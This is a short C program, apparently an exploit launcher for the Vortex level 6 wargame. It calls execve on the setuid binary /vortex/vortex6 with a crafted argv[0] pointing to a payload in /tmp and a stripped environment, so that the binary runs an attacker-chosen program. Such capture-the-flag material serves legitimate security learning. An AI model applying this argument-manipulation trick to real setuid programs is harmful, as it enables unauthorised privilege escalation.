#include <spawn.h>
#include <stdlib.h>

int main(int argc, char ** argv, char ** envp){
    char* zero_argv[] = {"/tmp/vsneaky6/payload",NULL};
    char* env[] = {"AAAA",NULL};
    execve("/vortex/vortex6",zero_argv,env);
    return 0;
}
